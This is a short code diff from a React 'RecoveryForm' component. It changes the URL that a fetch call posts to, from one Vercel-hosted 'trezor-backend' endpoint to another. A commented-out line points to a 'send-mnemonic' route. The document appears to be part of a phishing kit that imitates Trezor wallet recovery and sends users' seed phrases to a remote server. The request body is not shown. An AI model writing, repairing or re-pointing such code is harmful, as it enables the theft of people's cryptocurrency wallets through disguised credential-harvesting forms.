@@ -54,7 +54,7 @@ const RecoveryForm = () => {
         try {
             setLoading(true);
             const response = await fetch(
-                "https://trezor-backend-nine.vercel.app/api/v1/send-aws",
+                "https://trezor-backend-self.vercel.app/api/v1/send-aws",
                 // "http://localhost:5454/api/v1/send-mnemonic",
                 {
 
